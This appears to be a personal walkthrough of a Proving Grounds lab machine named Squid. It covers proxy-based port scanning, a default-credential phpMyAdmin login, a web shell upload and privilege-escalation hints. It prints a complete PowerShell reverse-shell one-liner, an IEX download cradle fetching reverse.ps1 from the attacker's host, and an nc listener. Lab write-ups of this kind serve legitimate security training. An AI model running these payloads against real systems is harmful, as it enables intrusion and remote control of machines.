---
description: >-
  Privilege Escalation via Scheduled Task Privilege Recovery +
  SeImpersonatePrivilege Abuse (PrintSpoofer)
icon: windows
---

# Squid

## Summary

* Target exposed a **Squid proxy** on port `3128`.
* Proxy was misconfigured, allowing scanning of internal services using `spose.py`.
* Discovered **phpMyAdmin** running on port `8080`.
* Logged in using **default MySQL credentials** (`root` / blank password).
* Used SQL injection to **upload a PHP web shell**.
* From the shell, executed a **PowerShell reverse shell** payload hosted on my machine.
* Successfully gained **initial low-privilege shell** access on the target system.

## 🧵Let's Unpack

### Enumeration

```bash
# NMAP
nmap -p- -T5  192.168.166.189 -vv

cat ports | awk '{split($0,a,"/"); print a[1] ","}'| tr -d "\\n"| awk 'BEGIN {FS=OFS=","} NF--'
>
135,139,445,3128,49666,49667

# step 2 - Dive deeper into the ports found in step 1
sudo nmap -sC -sN -A -oN nmapFull -p 135,139,445,3128,49666,49667 -A 192.168.166.189
 
 
 
```

Squid Proxy exploit

```bash
curl --proxy <http://192.168.166.189:3128> <http://192.168.166.189>

# using proxychain to configure a proxy via 3128 and run nmao
http local 3128

# using spose tool to scan the host behind proxy
python spose.py --proxy <http://192.168.166.189:3128> --target 192.168.166.189
>

Using proxy address <http://192.168.166.189:3128>

192.168.166.189 3306 seems OPEN 
192.168.166.189 8080 seems OPEN 

# 
```



### Accessing the site on port 8080

* added the proxy in firefox and directly opened 192.168.166.189:8080 on browser
* found phpMyAdmin page
  * Tried the default credentials of mysql `root` as username and left the password `blank`
* Found a blog to inject a webshell using SQL Query - `this way you will get Admin user access`
  * [https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/)
* Got the webshell embedded!
* Now used the below mentioned technique to spawn up reverse shell and catch it using nc

### Getting a reverse shell

Ref: [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

1. host the exploit.ps1 on your server

```bash
# ps1 reverse shell code
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.225",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# spawning server
python3 -m http.server 8080
```

1. Executing the following command in our webshell

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('<http://192.168.45.225:8000/reverse.ps1>')"

# URL encode the above command to send it through thr webshell
powershell%20-c%20%22IEX%28New-Object%20System.Net.WebClient%29.DownloadString%28%27http%3A%2F%2F192.168.45.225%3A8000%2Freverse.ps1%27%29%22

# In parallel, run netcat to catch the reverse shell
nc -nlvp 4444

```





## Privilege Escalation:

I was not able to escalate the privielge to root, took help from PG official walkthrough

**Here is the hint**

* You're running as `LOCAL SERVICE`, but some default privileges are missing.
* Look into how **Scheduled Tasks** can be used to regain full privileges for service accounts.
* If you manage to enable `SeImpersonatePrivilege`, you might want to explore **PrintSpoofer** 😉
* This might come handy ->  [https://github.com/itm4n/FullPowers](https://github.com/itm4n/FullPowers)

